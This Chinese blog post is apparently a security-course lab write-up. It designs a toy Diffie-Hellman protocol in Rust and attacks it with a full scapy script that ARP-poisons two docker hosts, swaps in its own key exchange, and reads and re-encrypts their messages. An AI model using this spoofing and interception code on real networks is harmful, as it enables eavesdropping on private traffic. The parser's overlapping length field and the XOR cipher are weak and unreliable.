---
title: DH密钥交换协议的设计与中间人攻击
date: 2022-06-08 22:04:37
mathjax: true
tags: 
- 网络空间安全实践
- 密钥交换协议
- rust
- scapy
- arp
---

## 关于DH密钥交换协议

现在有一个client-A和server-B，client想要连接到server-B

![figure-1](/images/figure-1.png)

如图

1. client 首先随机一个大素数p，然后得到该p的原根g，这俩作为公钥在internet上交换。再生成一个随机数a（0<a<p-1，大于等与p-1会回到起点）作为私钥，计算$A=g^a\mod p$，将p、g、A一并发送给server。此即handshake-request。
2. server收到request后，也随机选择一个随机数b（同a）作为私钥，发送$B=g^b\mod p$ 回client，并计算自己最终的私钥为$key=A^b\equiv g^{ab}\mod p$。此即handshake-reply。client收到reply后也确定 $key=B^a\equiv g^{ab}\mod p$，密钥交换完成，连接建立。

连接建立后，双方互相传输通过key加密的消息。

<!--more-->

## 目的

1. 设计基于DH密钥交换协议加密的客户端与服务端，能互相发送消息
2. 基于上面的设计利用ARP欺骗进行中间人攻击

## 设计

### 协议设计

将协议布置到Udp层上，DHLayer采用`'DH'`标识头，content-type为3种，分别是`HAND_SHAKE_REQUEST`,`HAND_SHAKE_REPLY`,`DATA_TRANSMISSION`，剩下的全部是payload，length在三种content-type分别表示p+g+A的长度、B的长度、传输的消息的长度。

> 由于最近看了好久rust所以决定上手一下，可是还是好难哇QAQ，项目dh_protocol[地址](https://github.com/xhzq233/dh_protocol)

```rust
pub struct DHLayer<'a> {
    // constant value: ['D','H']
    pub dh_identifier: [u8; 2],
    // 1 or 2 or 3
    pub content_type: u8,
    // 1 => 3*16, length of p and g and upper_a
    // 2 => 1*16, length of upper_b
    // 3 => length of data(payload)
    pub length: u32,
    // p + g + upper_a when type is 1,
    // upper_b when type is 2,
    // data when type is 3
    pub payload: &'a [u8],
}
```

Parse bytes to DHLayer:

```rust
pub fn from(udp_payload: &[u8]) -> Option<DHLayer> {
    if matches!(udp_payload[0..2].try_into(),Ok(DH_IDENTIFIER)) {
        let content_type = udp_payload[2];
        if content_type > DATA_TRANSMISSION || content_type < HAND_SHAKE_REQUEST {
            None
        } else {
            let length = u32::from_le_bytes(udp_payload[2..6].try_into().ok()?);
            Some(DHLayer {
                dh_identifier: DH_IDENTIFIER,
                content_type,
                length,
                payload: &udp_payload[7..],
            })
        }
    } else {
        None
    }
}
```

采用unsigned128bits 来表示Key类型:

```rust
pub type Key = u128;
```

计算原根与模重复平方:

```rust
fn get_primitive_root(prime: Key) -> Option<Key> {
    let k = (prime - 1) >> 1;
    for i in (2..prime / 2).rev() {//从高处开始找，找大数
        if power_mod(i, k, prime) != 1 {
            return Some(i);
        }
    }
    None
}

fn power_mod(g: Key, power: Key, p: Key) -> Key {
    let mut res: Key = 1;
    let mut g = g % p;
    let mut power = power;
    while power > 0 {
        if (power & 0x01) == 0x01 {
            res = (res * g) % p;
        }
        power = power >> 1;
        g = (g * g) % p;
    }
    res
}
```

成功在Udp上传输:

<img src="/images/layer_success.png" alt="layer_success" style="zoom:33%;" />

> data段，44 48 表示DH辨识，01表示type1 handshake request，30表示payload长度为48。

client与server能正常通信:

<img src="/images/通信.png" alt="通信" style="zoom:43%;" />

### 中间人攻击设计

如图

![figure-2](/images/figure-2.png)

ARP中毒后，A与B直接消息不能直达，而是会通过M。

1. 首先A发送request到M。
2. M收到 `p, g, A` 后计算 `B `后返回reply给A，并储存一个`KeyA2B` ，此时A与M建立连接。同时M选择`p', g', a'`发送一个request给B。
3. server收到 `p', g', A'` 后返回reply给M，M接受 `B'` 后储存 `KeyB2A` ，至此B与M建立连接。

攻击完成，M掌握两端的Key，当两端进行data-transmission时用两个Key解一次、加密一次即可，所以M能在不影响两端通信同时监听其中的消息。

<details>
<summary>"main.py"</summary>
<pre>
from scapy.all import *
from scapy.layers.inet import *
from time import *
import _thread
from scapy.layers.l2 import ARP
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.1"
MAC_B = "02:42:c7:a2:0e:8e"
IP_M = "10.9.0.7"
MAC_M = "02:42:0A:09:00:07"
A2B_KEY = 0
B2A_KEY = 0
S_P = 14369311563226165913
S_G = 7184655781613082955
S_A = 2017
def arp_spoof():
    # Construct spoofed ARP sent to machine A
    ether1 = Ether()
    ether1.dst = MAC_A
    arp1 = ARP()
    arp1.psrc = IP_B
    arp1.hwsrc = MAC_M
    arp1.pdst = IP_A
    arp1.op = 1
    frame1 = ether1 / arp1
    # Construct spoofed ARP sent to machine B
    ether2 = Ether()
    ether2.dst = MAC_B
    arp2 = ARP()
    arp2.psrc = IP_A
    arp2.hwsrc = MAC_M
    arp2.pdst = IP_B
    arp2.op = 1
    frame2 = ether2 / arp2
    while 1:
        sendp(frame1)
        sendp(frame2)
        sleep(5)
def mod_p(x, exp, p) -> int:
    res = 1
    x = x % p
    while exp > 0:
        if exp & 1:
            res = (res * x) % p
        exp = exp >> 1
        x = (x * x) % p
    return res
def encrypt(data: bytes, key) -> bytes:
    a = bytearray()
    key = u128to_bytes(key)
    for i in range(len(data)):
        a.append(data[i] ^ key[i % 16])
    return a
decrypt = encrypt
def u128to_bytes(u128: int):
    return u128.to_bytes(byteorder="little", length=16)
def spoof_pkt(pkt):
    global A2B_KEY
    global B2A_KEY
    global S_P
    global S_G
    global S_A
    if pkt.haslayer(IP) and hasattr(pkt[UDP], "payload"):
        del pkt[IP].chksum
        del pkt[UDP].chksum
        data = pkt[UDP].payload.load
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            if data[2] == 1:  # request
                reply_to_a = pkt
                reply_to_a.src = MAC_M
                reply_to_a.dst = MAC_B
                del reply_to_a[UDP].payload
                A = mod_p(S_G, S_A, S_P)
                reply_dh_layer = b"\x44\x48\x01\x30\x00\x00\x00" + u128to_bytes(S_P) \
                                 + u128to_bytes(S_G) + u128to_bytes(A)
                sendp(reply_to_a / reply_dh_layer)
                p, g, ua = [int.from_bytes(data[7 + 16 * i: 7 + 16 * (i + 1)], byteorder='little') for i in range(3)]
                print("recv handshake request from a to b: ", p, g, ua)
                B = mod_p(g, S_A, p)  # 随意一个b, 直接把S_A当作b了
                A2B_KEY = mod_p(ua, S_A, p)  # 随意一个b
                pkt.src = MAC_M
                pkt.dst = MAC_A
                pkt[IP].src = IP_B
                pkt[IP].dst = IP_A
                pkt[UDP].sport, pkt[UDP].dport = pkt[UDP].dport, pkt[UDP].sport
                del pkt[UDP].payload
                del pkt[IP].len
                del pkt[UDP].len
                request_to_b = pkt / b"\x44\x48\x02\x10\x00\x00\x00" + u128to_bytes(B)
                sendp(request_to_b)
            elif data[2] == 3:  # data transmission
                msg = decrypt(data[7:], A2B_KEY)
                print("recv msg from a to b: ", msg)
                new_msg = encrypt(msg, B2A_KEY)
                pkt.src = MAC_M
                pkt.dst = MAC_B
                del pkt[UDP].payload
                sendp(pkt / (data[:7] + new_msg))
        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
            if data[2] == 2:  # reply
                ub = int.from_bytes(data[7:], byteorder='little')
                B2A_KEY = mod_p(ub, S_A, S_P)
                print("recv handshake reply from b to a: ", ub)
            elif data[2] == 3:  # data transmission
                msg = decrypt(data[7:], B2A_KEY)
                print("recv msg from b to a: ", msg)
                new_msg = encrypt(msg, A2B_KEY)
                pkt.src = MAC_M
                pkt.dst = MAC_A
                del pkt[UDP].payload
                sendp(pkt / (data[:7] + new_msg))
_thread.start_new_thread(arp_spoof, ())
f = 'udp and (ether src {} or ether src {})'.format(MAC_A, MAC_B)
pkt = sniff(filter=f, prn=spoof_pkt)
</pre>
</details>

> 注意filter选项要使用ehter过滤，因为ip不可信。如果用ip过滤，自己发出的欺骗的包也会被嗅探

## 攻击

### 环境配置

利用docker开启一个10.9.0.0/24的局域网，client-A开启在10.9.0.5，使用seedlab的ubuntu，中间人M开启在10.9.0.7，M使用带有scapy的image。server-B直接开启在10.9.0.1，即启动docker的机器（在我这里是VM）。

`docker-compose.yml` :

```yaml
version: "3"
services:
    HostA:
        image: handsonsecurity/seed-ubuntu:large
        container_name: A-5
        tty: true
        volumes:
                - ./volumes:/volumes
        cap_add:
                - ALL
        networks:
            net-10.9.0.0:
                ipv4_address: 10.9.0.5
    HostM:
        image: travelping/scapy
        container_name: M-7
        tty: true
        cap_add:
                - ALL
        privileged: true
        volumes:
                - ./volumes:/volumes
        networks:
            net-10.9.0.0:
                ipv4_address: 10.9.0.7
networks:
    net-10.9.0.0:
        name: net-10.9.0.0
        ipam: 
            config:
                - subnet: 10.9.0.0/24
```

volumes文件夹里放好已经编译好的linux可执行文件 `dh_protocol` 和用于攻击的 `main.py` 。

首先要在M上运行 `sysctl net.ipv4.ip_forward=0` 来关闭ip转发，否则arp欺骗后M会自动帮你转发数据包并且附上icmp redirect包。

### 开始攻击

1. M:  `python3 main.py`
2. B:  `./dh protocol -s -i 10.9.0.1`
3. A: `./dh protocol -c -i 10.9.0.5 -d 10.9.0.1`

显示A B成功建立连接，M也得到了双方的Key，输入测试数据，AB之间的消息M直接拿下。

<img src="/images/figure-3.png" alt="figure-3" style="zoom:33%;" />

<img src="/images/figure-4.png" alt="figure-4" style="zoom: 33%;" />

### 分析过程

1. 151 A发给B握手请求，实则发给了M（ehter ...:07）

<img src="/images/151.png" alt="151" style="zoom:33%;" />

2. 152 M发送伪造请求给B，153 B回应给M握手成功

<img src="/images/152.png" alt="152" style="zoom:33%;" />

<img src="/images/153.png" alt="153" style="zoom:33%;" />

3. 154 便是M伪造回应发给A，可以发现跟预设计的无差别。

### Failed?

正常成功欺骗的话，A与B边的消息往来都是x2的，也就是两个中一个是伪造的（如图序号16之前）

![failed](/images/failed.png)

但是当arp缓存失效就会导致两边直接消息往来未经过M，由于两边Key不一样所以无法互相理解（如图从序号17开始，到25、26时就出现了错误的）

所以解决办法应该是？缩短arp_spoof的时间间隔。
